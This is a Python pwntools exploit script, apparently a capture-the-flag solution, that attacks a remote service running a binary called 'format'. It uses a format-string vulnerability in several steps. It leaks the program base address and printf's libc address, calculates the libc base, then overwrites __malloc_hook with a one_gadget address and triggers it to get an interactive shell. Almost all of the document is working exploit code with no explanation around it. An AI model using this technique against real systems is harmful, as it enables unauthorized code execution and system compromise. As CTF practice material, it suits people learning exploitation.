from pwn import *
context.arch = "amd64"
context.log_level = 'debug'
elf = ELF("format")
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
#libc = ELF("libc6_2.27-3ubuntu1_amd64.so") # <-- Loading leaked libc 
#p = process("./format")
p = remote('188.166.173.208', 30142)
#gdb.attach(p,'''b*__malloc_hook''')
# ELF base address - leaking && calculating ---
p.sendline("%37$p")
init_leak = (p.recvline())
log.success("LEAK => (init+117) address: " + init_leak)
base_elf = int(init_leak,16) - 0x126d
log.info("Base ELF address: " + hex(base_elf))
elf.address = base_elf # updating ELF
# ---
# Leaking __printf address through printf() ---
printf_got_plt = elf.got["printf"]
log.info("printf@got.plt address: " + hex(printf_got_plt))
p.sendline("AAAA%7$s" + p64(printf_got_plt))
printf_leak = p.recv()
printf_libc = u64(printf_leak[4:10].ljust(8,"\x00"))
log.success("Leaked __printf: " + hex(printf_libc))
# ---
# Calculating base libc, __malloc_hook and one_gadget ---
base_libc = printf_libc - 0x64e80
malloc_hook_addr = base_libc + 0x3ebc30
one_gadget = base_libc + 0x4f322
# ---
# Taking control of exeuction flow - overriding __malloc_hook with one_gadget ---
p.sendline(fmtstr_payload(6, { malloc_hook_addr: one_gadget }))
p.recv()
p.sendline('%100000c') # __malloc_hook trigger
p.interactive()
p.close()
# ---
